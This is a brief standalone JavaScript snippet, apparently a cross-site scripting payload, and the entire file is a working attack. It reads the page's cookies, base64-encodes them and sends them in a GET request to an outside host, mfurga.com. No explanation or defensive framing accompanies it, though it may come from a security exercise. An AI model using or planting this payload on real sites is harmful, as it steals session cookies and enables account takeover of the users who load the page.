"use strict";
(function() {
  var req = new XMLHttpRequest();
  req.open(
    "GET", "https://mfurga.com?data=" + btoa(document.cookie), false);
  req.send();
})();